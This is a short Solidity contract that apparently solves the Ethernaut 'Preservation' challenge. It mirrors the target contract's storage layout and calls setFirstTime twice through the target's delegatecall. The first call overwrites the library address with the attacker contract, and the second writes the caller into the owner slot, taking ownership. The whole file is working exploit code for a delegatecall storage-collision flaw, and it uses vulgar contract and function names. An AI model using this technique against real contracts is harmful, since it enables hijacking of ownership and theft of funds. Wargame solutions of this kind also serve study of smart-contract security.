// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract FuckPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    IPreservation preservation;

    constructor(address _address) {
        preservation = IPreservation(_address);
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }

    function fuck() external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }
}
